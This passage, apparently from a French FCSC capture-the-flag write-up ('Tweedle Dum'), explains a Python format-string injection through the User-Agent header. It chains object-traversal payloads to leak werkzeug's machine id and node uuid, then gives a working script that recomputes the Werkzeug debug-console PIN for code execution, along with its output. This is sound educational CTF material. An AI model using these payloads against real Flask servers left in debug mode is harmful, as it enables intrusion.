+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;Tweedle Dum&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/style.css&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">main</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bubble&#34;</span>&gt;Hello &amp;lt;class &amp;#39;werkzeug.user_agent.UserAgent&amp;#39;&amp;gt;&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">main</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!-- &lt;a href=&#34;/console&#34;&gt;Werkzeug console&lt;/a&gt; --&gt;</span>
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>Nous avons une <code>&lt;class 'werkzeug.user_agent.UserAgent'&gt;</code> en sortie de cette format string.</p>
+<h4 id="from-format-string-to-rce">From Format-string to RCE:</h4>
+<p>On remarque dans l&rsquo;html ce commentaire :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/console&#34;</span>&gt;Werkzeug console&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span></code></pre></div><p>En y accédant, on se retrouve confronté à un code pin :</p>
+<p><img src="./img/2.png" alt="Alt text"></p>
+<p>La présence de cette console de <em>debug</em> s&rsquo;explique par la présence de cet argument passé dans l&rsquo;application flask <em>(Dockerfile)</em> :</p>
+<ul>
+<li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>CMD <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;flask&#34;</span>, <span style="color:#e6db74">&#34;run&#34;</span>, <span style="color:#e6db74">&#34;--host=0.0.0.0&#34;</span>, <span style="color:#e6db74">&#34;--port=2202&#34;</span>, <span style="color:#e6db74">&#34;--debug&#34;</span><span style="color:#f92672">]</span>
+</span></span></code></pre></div></li>
+</ul>
+<p>L&rsquo;idée ici va être de retrouver ce pin pour accéder à cette console et ainsi exécuter des commandes directement.</p>
+<p>Cette théorie est appuyée par la présence de cette ligne dans <code>app.py</code> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>DebuggedApplication<span style="color:#f92672">.</span>_fail_pin_auth <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> self: <span style="color:#66d9ef">None</span>
+</span></span></code></pre></div><p>Si on compare avec la fonction <strong>_fail_pin_auth</strong> originale (<a href="https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/__init__.py#L436" target="_blank">présente ici</a>) :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_fail_pin_auth</span>(self) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">5.0</span> <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>_failed_pin_auth <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">5</span> <span style="color:#66d9ef">else</span> <span style="color:#ae81ff">0.5</span>)
+</span></span><span style="display:flex;"><span>    self<span style="color:#f92672">.</span>_failed_pin_auth <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>On comprend que l&rsquo;auteur du challenge réécris le compteur d&rsquo;échec de tentative de pin pour empêcher d&rsquo;être banni par le serveur et de ne plus pouvoir résoudre le challenge.</p>
+<h3 id="récupération-du-pin-">Récupération du pin :</h3>
+<p>On va se rendre dans le code source de <em>werkzeug</em> pour comprendre comment ce pin est généré :
+Lien: <a href="https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/__init__.py#L138" target="_blank">ici</a></p>
+<p>Voici le code complet qui génère le pin :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>probably_public_bits <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    username,
+</span></span><span style="display:flex;"><span>    modname,
+</span></span><span style="display:flex;"><span>    getattr(app, <span style="color:#e6db74">&#34;__name__&#34;</span>, type(app)<span style="color:#f92672">.</span>__name__),
+</span></span><span style="display:flex;"><span>    getattr(mod, <span style="color:#e6db74">&#34;__file__&#34;</span>, <span style="color:#66d9ef">None</span>),
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>private_bits <span style="color:#f92672">=</span> [str(uuid<span style="color:#f92672">.</span>getnode()), get_machine_id()]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>h <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> bit <span style="color:#f92672">in</span> chain(probably_public_bits, private_bits):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> bit:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> isinstance(bit, str):
+</span></span><span style="display:flex;"><span>        bit <span style="color:#f92672">=</span> bit<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
+</span></span><span style="display:flex;"><span>    h<span style="color:#f92672">.</span>update(bit)
+</span></span><span style="display:flex;"><span>h<span style="color:#f92672">.</span>update(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;cookiesalt&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cookie_name <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;__wzd</span><span style="color:#e6db74">{</span>h<span style="color:#f92672">.</span>hexdigest()[:<span style="color:#ae81ff">20</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> num <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    h<span style="color:#f92672">.</span>update(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;pinsalt&#34;</span>)
+</span></span><span style="display:flex;"><span>    num <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>int(h<span style="color:#f92672">.</span>hexdigest(), <span style="color:#ae81ff">16</span>)<span style="color:#e6db74">:</span><span style="color:#e6db74">09d</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>[:<span style="color:#ae81ff">9</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> rv <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> group_size <span style="color:#f92672">in</span> <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">3</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(num) <span style="color:#f92672">%</span> group_size <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>            rv <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">.</span>join(
+</span></span><span style="display:flex;"><span>                num[x : x <span style="color:#f92672">+</span> group_size]<span style="color:#f92672">.</span>rjust(group_size, <span style="color:#e6db74">&#34;0&#34;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(num), group_size)
+</span></span><span style="display:flex;"><span>            )
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        rv <span style="color:#f92672">=</span> num
+</span></span></code></pre></div><p>Toute la génération se base sur 2 listes pour un total de 6 variables :</p>
+<ul>
+<li>probably_public_bits
+<ul>
+<li>username</li>
+<li>modname</li>
+<li>app.__name__</li>
+<li>app.__file__</li>
+</ul>
+</li>
+<li>private_bits
+<ul>
+<li>uuid.getnode()</li>
+<li>get_machine_id()</li>
+</ul>
+</li>
+</ul>
+<p>Récupérons donc toute ces variables !</p>
+<h5 id="username">Username:</h5>
+<p>La valeur est spécifié dans le <em>Dockerfile</em>, c&rsquo;est le nom d&rsquo;utilisateur qui lance le serveur:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>USER guest
+</span></span></code></pre></div><p>Nous avons donc une partie des <code>probably_public_bits</code>: <code>username=guest</code></p>
+<h5 id="modname">Modname:</h5>
+<p>La valeur du <code>modname</code> est constante : <code>modname=flask.app</code></p>
+<h5 id="app__name__">App.__name__:</h5>
+<p>La valeur du <code>app.__name__</code> est constante : <code>app.__name__=Flask</code></p>
+<h5 id="app__file__">App.__file__:</h5>
+<p>On cherche ici a récupérer le <em>path</em> du fichier <code>app.py</code> interne à flask. Ici, deux méthodes s&rsquo;offrent à nous :</p>
+<ul>
+<li>Démarrer l&rsquo;application en local avec le Dockerfile et récupérer le chemin d&rsquo;accès.</li>
+<li>Utiliser le StackTrace de flask pour récupérer le path dans les logs verbeux renvoyés par le serveur.</li>
+</ul>
+<p>J&rsquo;ai utilisé la 2nd méthode.</p>
+<p>Si on envoie un User-Agent avec une payload volontairement erronée comme <code>{ua.__class__.vozec}</code>, on obtient:</p>
+<p><img src="./img/3.png" alt="Alt text"></p>
+<p>=&gt; <code>app.__file__=/usr/local/lib/python3.10/site-packages/flask/app.py</code></p>
+<h4 id="uuid-et-machineid">Uuid et MachineId</h4>
+<p>Vient ici toute la difficulté du challenge.</p>
+<p>Nous allons devoir utiliser la format string pour faire fuiter ces informations.</p>
+<p>On retourne dans le code source de <code>werkzeug</code> pour localiser ou sont ces informations.</p>
+<ul>
+<li>
+<p>La variable <em>_machine_id</em> est globale ce qui veut qu&rsquo;elle est récupérable dans le module <code>werkzeug.debug</code> <a href="https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/__init__.py#L45" target="_blank">ici</a></p>
+</li>
+<li>
+<p>De même, <code>uuid</code> est un module opensource présent dans le coeur de Python et la variable recherchée et elle aussi globale <a href="https://github.com/python/cpython/blob/main/Lib/uuid.py#L648" target="_blank">ici</a></p>
+</li>
+</ul>
+<h3 id="exploitation-complète-de-la-format-string">Exploitation complète de la Format-String:</h3>
+<p>Au cours de mes recherches, j&rsquo;ai trouvé ce writeup du TokyoWesterns CTF 2018 : <a href="https://ctftime.org/writeup/10851" target="_blank">Shrine writeup</a>. Il est très instructif mais surtout, nous fournit ce code pour parcourir les objets python.</p>
+<p>Notre but ici va être de trouver un moyen de :</p>
+<ul>
+<li>Accéder au modules <code>sys</code></li>
+<li>Utiliser <code>sys</code> pour retrouver les autres modules</li>
+<li>Accéder à <code>werkzeug.debug</code></li>
+<li>Accéder à <code>werkzeug.debug.uuid._node</code> et <code>werkzeug.debug._machine_id</code></li>
+</ul>
+<p>On utilise ce code python pour explorer le module <code>ua</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request, render_template
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hello_agent</span>():
+</span></span><span style="display:flex;"><span>    best <span style="color:#f92672">=</span> <span style="color:#ae81ff">9999999999</span>
+</span></span><span style="display:flex;"><span>    ua <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>user_agent
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> path, obj <span style="color:#f92672">in</span> search(ua, <span style="color:#ae81ff">50</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> str(obj)<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;&lt;module &#39;sys&#39;&#34;</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> len(path) <span style="color:#f92672">&lt;</span> best:
+</span></span><span style="display:flex;"><span>                best <span style="color:#f92672">=</span> len(path)
+</span></span><span style="display:flex;"><span>                print(path)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;hello&#39;</span>:<span style="color:#e6db74">&#39;World&#39;</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">search</span>(obj, max_depth):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    visited_clss <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    visited_objs <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">visit</span>(obj, path<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;obj&#39;</span>, depth<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">yield</span> path, obj
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> depth <span style="color:#f92672">==</span> max_depth:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> isinstance(obj, (int, float, bool, str, bytes)):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> isinstance(obj, type):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> obj <span style="color:#f92672">in</span> visited_clss:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>            visited_clss<span style="color:#f92672">.</span>append(obj)
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># print(obj)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> obj <span style="color:#f92672">in</span> visited_objs:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>            visited_objs<span style="color:#f92672">.</span>append(obj)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># attributes</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> name <span style="color:#f92672">in</span> dir(obj):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> name<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;__&#39;</span>) <span style="color:#f92672">and</span> name<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#39;__&#39;</span>):
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> name <span style="color:#f92672">not</span> <span style="color:#f92672">in</span>  (<span style="color:#e6db74">&#39;__globals__&#39;</span>, <span style="color:#e6db74">&#39;__class__&#39;</span>, <span style="color:#e6db74">&#39;__self__&#39;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#39;__weakref__&#39;</span>, <span style="color:#e6db74">&#39;__objclass__&#39;</span>, <span style="color:#e6db74">&#39;__module__&#39;</span>):
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>            attr <span style="color:#f92672">=</span> getattr(obj, name)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">yield from</span> visit(attr, <span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(path, name), depth <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># dict values</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> hasattr(obj, <span style="color:#e6db74">&#39;items&#39;</span>) <span style="color:#f92672">and</span> callable(obj<span style="color:#f92672">.</span>items):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> k, v <span style="color:#f92672">in</span> obj<span style="color:#f92672">.</span>items():
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">yield from</span> visit(v, <span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">[</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">]&#39;</span><span style="color:#f92672">.</span>format(path, repr(k)), depth)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># items</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> isinstance(obj, (set, list, tuple, frozenset)):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> i, v <span style="color:#f92672">in</span> enumerate(obj):
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">yield from</span> visit(v, <span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">[</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">]&#39;</span><span style="color:#f92672">.</span>format(path, repr(i)), depth)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">yield from</span> visit(obj)
+</span></span></code></pre></div><p>On peut accéder au module <code>sys</code> de ces différentes manières :</p>
+<p>-</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{ua<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[t]<span style="color:#f92672">.</span>sys}
+</span></span></code></pre></div><p>-
+<code>python {ua.__class__.to_header.__globals__['__loader__'].__class__.__weakref__.__objclass__.get_data.__globals__['__loader__'].create_module.__globals__['__builtins__']['__build_css__'].__self__.copyright.__class__._Printer__setup.__globals__['sys']} </code></p>
+<p><em>Résultat</em> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bubble&#34;</span>&gt;Hello &lt;<span style="color:#f92672">module</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">sys</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">built-in</span><span style="color:#960050;background-color:#1e0010">)</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span></code></pre></div><p>On peut donc sélectionner le module <strong>werkzeug.debug</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{ua<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[t]<span style="color:#f92672">.</span>sys<span style="color:#f92672">.</span>modules[werkzeug<span style="color:#f92672">.</span>debug]}
+</span></span></code></pre></div><p>puis enfin, les deux variables tant recherchées:</p>
+<p>-
+<code>python {ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id} </code></p>
+<p>-
+<code>python {ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node} </code></p>
+<h4 id="combinaison-des-informations-et-rce-finale-">Combinaison des informations et RCE finale :</h4>
+<p>On peut donc tous lier pour obtenir le pin :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> html
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> chain
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://tweedle-dum.france-cybersecurity-challenge.fr&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">render</span>(payload):
+</span></span><span style="display:flex;"><span>	r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url,headers<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;User-Agent&#34;</span>:payload})<span style="color:#f92672">.</span>text
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> html<span style="color:#f92672">.</span>unescape(re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;Hello (.*?)&lt;/div&gt;&#39;</span>,r)[<span style="color:#ae81ff">0</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>machine_id <span style="color:#f92672">=</span> render(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>uuid <span style="color:#f92672">=</span> eval(render(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#75715e"># b&#39;XXX-XXX-XXX...&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>probably_public_bits <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;guest&#39;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;flask.app&#39;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;Flask&#39;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;/usr/local/lib/python3.10/site-packages/flask/app.py&#39;</span>,
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>private_bits <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>	machine_id,
+</span></span><span style="display:flex;"><span>	uuid
+</span></span><span style="display:flex;"><span> ]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>num <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>rv <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>h <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> bit <span style="color:#f92672">in</span> chain(probably_public_bits, private_bits):
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> bit:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> isinstance(bit, str):
+</span></span><span style="display:flex;"><span>		bit <span style="color:#f92672">=</span> bit<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
+</span></span><span style="display:flex;"><span>	h<span style="color:#f92672">.</span>update(bit)
+</span></span><span style="display:flex;"><span>h<span style="color:#f92672">.</span>update(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;cookiesalt&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cookie_name <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;__wzd</span><span style="color:#e6db74">{</span>h<span style="color:#f92672">.</span>hexdigest()[:<span style="color:#ae81ff">20</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> num <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>	h<span style="color:#f92672">.</span>update(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;pinsalt&#34;</span>)
+</span></span><span style="display:flex;"><span>	num <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>int(h<span style="color:#f92672">.</span>hexdigest(), <span style="color:#ae81ff">16</span>)<span style="color:#e6db74">:</span><span style="color:#e6db74">09d</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>[:<span style="color:#ae81ff">9</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> rv <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> group_size <span style="color:#f92672">in</span> <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">3</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> len(num) <span style="color:#f92672">%</span> group_size <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>			rv <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">.</span>join(
+</span></span><span style="display:flex;"><span>				num[x : x <span style="color:#f92672">+</span> group_size]<span style="color:#f92672">.</span>rjust(group_size, <span style="color:#e6db74">&#34;0&#34;</span>)
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(num), group_size)
+</span></span><span style="display:flex;"><span>			)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>		rv <span style="color:#f92672">=</span> num
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(rv)
+</span></span></code></pre></div><p><em>Résultat</em> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>/mnt/c/Users/vozec/Desktop<span style="color:#f92672">]</span>$ python3 FCSC/Tweedle<span style="color:#ae81ff">\ </span>Dum.py
+</span></span><span style="display:flex;"><span>415-333-840
